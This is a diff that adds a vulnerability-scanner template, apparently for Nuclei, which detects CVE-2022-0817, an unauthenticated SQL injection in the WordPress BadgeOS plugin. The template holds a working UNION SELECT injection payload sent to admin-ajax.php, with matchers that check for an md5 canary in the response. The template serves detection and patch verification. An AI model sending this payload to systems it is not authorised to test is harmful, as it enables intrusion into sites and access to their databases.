@@ -1,0 +1,33 @@
+id: wordpress-badgeos-sqli-cve-2022-0817
+info:
+  name: Wordpress BadgeOS Plugin SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a SQL injection vulnerability in WordPress plugin BadgeOS versions before 3.7.0. The vulnerability stems from the fact that certain parameters passed by the plugin through AJAX operations are not properly cleaned and escaped before being used to splice SQL statements. Unauthenticated users can use this vulnerability to implement SQL injection attacks.
+  classification:
+    cve-id: CVE-2022-0817
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.6
+  tags: sql-injection,wordpress,plugin
+  reference:
+    - https://wordpress.org/plugins/badgeos/
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5(890),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "fff11dd7e8d9c510"
+          - "badgeos-arrange-buttons"
+        part: body
